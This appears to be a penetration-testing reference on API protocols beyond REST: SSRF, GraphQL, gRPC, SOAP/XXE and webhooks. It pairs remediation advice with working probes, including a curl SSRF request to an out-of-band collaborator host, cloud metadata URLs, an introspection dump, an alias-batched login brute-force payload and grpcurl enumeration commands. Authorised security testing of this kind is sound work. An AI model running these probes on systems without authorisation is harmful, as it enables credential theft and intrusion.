# Protocols & SSRF — API7 · GraphQL · gRPC · SOAP · Webhooks

API-specific depth for the protocols beyond plain REST, plus API7 SSRF. Payload
mechanics for GraphQL and SSRF are in `web-vuln-hunting/references/graphql-and-api.md`
and `web-vuln-hunting/references/ssrf.md`; this file adds the API-Top-10 framing,
discovery, and the non-HTTP protocols.

---

## API7:2023 — Server-Side Request Forgery (SSRF)

Any API parameter that makes the server fetch a URL: `url=`, `image_url=`,
`webhook=`, `callback=`, `redirect=`, `avatar`, `fetch`, PDF/preview/import
features, and upstream-integration configs.

### How to find
Grep the OpenAPI spec and JS for URL-taking params; any "import from URL",
"screenshot", "webhook target", "profile picture by URL", "SSO metadata URL"
feature is a candidate.

### How to test (safe PoC — collaborator, not internal scanning)
```bash
# 1. Prove the server makes the request to a host YOU control (out-of-band).
curl -s -X POST https://api.target.com/api/v1/import \
  -H "Authorization: Bearer $A_TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"https://YOUR-COLLABORATOR.oastify.com/ssrf-poc"}'
#    A hit on your collaborator confirms SSRF.

# 2. Cloud metadata (single targeted probe to prove impact, then STOP):
#    AWS IMDSv2 is safer to cite; do not loop or scrape credentials at volume.
#      http://169.254.169.254/latest/meta-data/
#      http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
```
Bypasses (from ssrf.md): IP encodings, `[::]`, DNS rebinding, redirect chains,
`@`-tricks. **Safety:** confirm reachability with **one** metadata/internal
probe; do **not** port-scan the internal network broadly or exfiltrate cloud
credentials beyond minimal proof. Redact any secret returned.

### Real disclosed pattern
"Fetch image by URL" reaching `169.254.169.254` → AWS role credentials;
webhook-target field pointing at internal admin service; SSO metadata-URL import
hitting internal hosts.

### Remediation
Allow-list output hosts/schemes; resolve-then-validate (block RFC1918/link-local/
metadata IPs after DNS resolution); no user-controlled redirects; enforce IMDSv2;
egress firewall from app servers.

---

## GraphQL

Endpoints: `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphiql`, `/query`.
Maps onto the Top 10: **API1/API3** (object & field authz), **API4** (query cost),
**API2** (auth bypass via batching), **API8** (introspection on in prod).

### How to find & enumerate
```bash
# Introspection (API8 misconfig): dump the schema
curl -s https://TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq '.data.__schema.types|length'

graphql-cop -t https://TARGET/graphql          # misconfig scanner (introspection, batching, CSRF, field suggestions)
clairvoyance https://TARGET/graphql -o schema.json   # recover schema when introspection is OFF, via field suggestions
```
If introspection is disabled but the server returns "Did you mean …?" suggestions
(Apollo default), **clairvoyance** rebuilds the schema from those hints. Report
suggestions-enabled as a misconfig even without full introspection.

### API-framed attacks
- **BOLA (API1)** via `node(id:)` / object-by-id queries — per-type authz often
  missing; fetch another user's object by id (1–2 objects, then stop).
- **Excessive data exposure (API3)** — request more fields than the UI shows
  (e.g. `passwordHash`, `email`, internal flags).
- **BFLA (API5)** — call admin mutations as a low-priv user.
- **Auth brute force via batching/aliasing (API2/API4)** — many operations in one
  HTTP request defeat naive per-request rate limits:
  ```json
  {"query":"mutation{a:login(u:\"x\",p:\"g1\"){t} b:login(u:\"x\",p:\"g2\"){t}}"}
  ```
  Prove the *control gap* with a **small** batch (a handful of aliases), report
  it — do **not** run a full password list. This is the API4 safe-probe rule.
- **Query-cost / depth DoS (API4)** — **report the possibility** of deep-nesting
  / circular queries; do **not** actually send an amplification query at in-scope
  prod. Cite the missing depth/cost limit as the finding.

### Remediation
Disable introspection **and** field suggestions in prod; enforce object- and
field-level authz in resolvers; query depth + cost limiting; per-operation rate
limits (not per-HTTP-request); disable aliasing-based amplification.

---

## gRPC

Binary HTTP/2 + Protobuf. Common on internal/mobile backends.

### How to find & test
- Look for `application/grpc` / HTTP/2, `.proto` files in mobile apps or repos,
  ports serving gRPC.
- **Reflection** (the gRPC analog of introspection): if server reflection is on,
  enumerate services/methods:
  ```bash
  grpcurl -plaintext TARGET:50051 list                 # list services
  grpcurl -plaintext TARGET:50051 list some.Service    # list methods
  grpcurl -plaintext -d '{"id":"1005"}' TARGET:50051 some.Service/GetOrder
  ```
- Same Top-10 logic applies: BOLA (id swap in the message), BFLA (call admin
  RPCs), missing authz per-method, verbose errors. Use `grpcui` for a UI, or the
  Burp gRPC/Protobuf tooling.

### Remediation
Disable reflection in prod; enforce per-method authz and auth; validate message
fields; TLS (`-plaintext` should fail).

---

## SOAP / XML APIs

Legacy but common in enterprise/finance. WSDL describes every operation.

### How to find & test
```bash
curl -s "https://TARGET/service.asmx?WSDL" -o service.wsdl   # enumerate all operations
# Craft SOAP envelopes per operation; test authz per operation (BFLA), IDOR in ids.
```
- **XXE** is the classic SOAP/XML risk — external entities in the XML body. Test
  per `web-vuln-hunting/references/injection.md`. **Do not** send billion-laughs /
  entity-expansion payloads (DoS — forbidden); use a benign out-of-band OOB entity
  to prove parsing, or a file-read to a known-benign path.
- WS-Security misuse, replay of signed messages, verbose SOAP faults leaking
  internals.

### Remediation
Disable external entity resolution (XXE); enforce per-operation authz; restrict
WSDL exposure; validate against strict XSD.

---

## Webhooks

Two directions, two risk profiles.

### Inbound (target receives webhooks) — you are the sender
- **Signature verification**: replay a captured webhook, then a **tampered** one
  (change `amount`/`status`) without a valid HMAC signature — does the target
  accept it? (Ties to API10 unsafe consumption + API2.)
- **Replay**: resend a valid signed webhook — is there a nonce/timestamp window?

### Outbound (target sends webhooks to a URL you configure) — SSRF surface
- Set the webhook target to an internal/metadata URL → API7 SSRF (use your
  collaborator first to confirm, one internal probe to prove).
- Test whether the target follows redirects from the webhook destination.

### Remediation
Verify HMAC signatures with a shared secret; enforce timestamp + nonce
(anti-replay); allow-list outbound webhook destinations (block internal ranges);
no redirect-following; time out and size-cap deliveries.

---

## Cross-reference
GraphQL/SSRF payload catalog: `web-vuln-hunting/references/graphql-and-api.md`,
`web-vuln-hunting/references/ssrf.md`, `web-vuln-hunting/references/injection.md`
(XXE). Access-control framing for BOLA/BFLA across protocols:
`references/access-control.md`.
